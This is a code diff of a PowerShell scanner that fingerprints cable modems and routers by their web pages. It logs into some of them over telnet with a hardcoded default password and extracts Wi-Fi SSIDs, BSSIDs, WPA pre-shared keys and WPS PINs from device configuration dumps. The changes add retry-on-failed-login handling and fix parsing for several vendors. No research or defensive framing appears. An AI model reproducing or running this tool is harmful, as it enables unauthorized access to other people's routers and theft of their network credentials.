@@ -109,10 +109,14 @@ function techTom($ip){
 			}
 
 			if(($BSSID -like '*PRIMARY*')){
-				($thompson -match '([0-9A-Fa-f]{2}[:]){5}[0-9A-Fa-f]{2}').split('()')
+				$BSSID = ($thompson -match '([0-9A-Fa-f]{2}[:]){5}[0-9A-Fa-f]{2}').split('()')[3].ToUpper().Trim()
 			}
 
-			"$BSSID - $PASS"
+			if(!($PASS -like '*0000000000*')){
+				"$BSSID - $PASS"
+			}
+			$BSSID
+			
 		}catch{
 			"Debugging error in Thompson"
 			$thompson
@@ -154,13 +158,18 @@ function cisco($ip){
 function wan($ip){
 	Write-Output "=========$ip - Wan=========" 
 	Get-Telnet -RemoteHost "$ip" -Commands " ","admin","Uq-4GIt3M","cd wifi","show nvram" 
-   	verifyFile
 	if([System.IO.File]::Exists($save)){
 		$wan = Get-Content $save
-		$SSID = ($wan -match 'wl0_ssid=.*').replace('wl0_ssid=','')
-		$BSSID = ($wan -match 'macaddr=.*').replace('macaddr=','').ToUpper()
-		$PASS = ($wan -match 'wl0_wpa_psk=.*').replace('wl0_wpa_psk=','')
-		$PIN = ($wan -match 'wps_device_pin=.*').replace('wps_device_pin=','')
+		if($wan -like '*Invalid login...*'){
+			Remove-Item $save
+			Get-Telnet -RemoteHost "$ip" -Commands "admin","Uq-4GIt3M","cd wifi","show nvram"
+			$wan = Get-Content $save
+		}
+		
+		$SSID = ($wan | Select-String -Pattern 'wl0_ssid=.*').Line.Replace('wl0_ssid=','')
+		$BSSID = ($wan | Select-String -Pattern 'macaddr=.*').Line.replace('macaddr=','').ToUpper()
+		$PASS = ($wan | Select-String -Pattern 'wl0_wpa_psk=.*').Line.replace('wl0_wpa_psk=','')
+		$PIN = ($wan | Select-String -Pattern 'wps_device_pin=.*').Line.replace('wps_device_pin=','')
 		"$SSID - $BSSID - $PASS"
 	}
 	
@@ -177,8 +186,8 @@ function motorola($ip){
 	if([System.IO.File]::Exists($save)){
 		$motorola = Get-Content $save
 		if($motorola -like '*Sagemcom*'){
-			$BSSID = ($thompson -match '([0-9A-Fa-f]{2}[:]){5}[0-9A-Fa-f]{2}').split('()')[1].ToUpper()
-			$PASS = (($thompson -match ('name="WpaPreSharedKey" size="*32"* maxlength="*64"* value=".*"')) -split 'value="')[1].split('"')[0]
+			$BSSID = ($motorola -match '([0-9A-Fa-f]{2}[:]){5}[0-9A-Fa-f]{2}').split('()')[1].ToUpper()
+			$PASS = (($motorola -match ('name="WpaPreSharedKey" size="*32"* maxlength="*64"* value=".*"')) -split 'value="')[1].split('"')[0]
 			"$SSID - $BSSID - $PASS"
 		}else{
 			$BSSID = ($motorola -match 'colspan=2 bgcolor=#E7DAAC>.*').split('()')[1].Trim()
@@ -319,10 +328,10 @@ function runScanner(){
 				".*<title>Common UI</title>.*" {techCGA0101 $line; break}
 				".*vt_docsystem.*" {techDPC3928SL2 $line; break}
 				".*CGNV2.*" {hitron $line; break}
-				".*Touchstone.*" {"$line - Arris (No support)"; Break}
+				".*Touchstone.*" {"=========$line - Arris (No support)========="; Break}
 				".*<title>Residential Gateway Configuration: Login</title>.*" {ubee $line; break}
 				".*<title>Residential Gateway Configuration: Cable Modem - Navigation</title>.*" {ubeeA $line; break}
-				default {Write-Output "$line - $title"; Break}
+				default {Write-Output "=========$line - $title========="; Break}
 			}
 		}
 	}
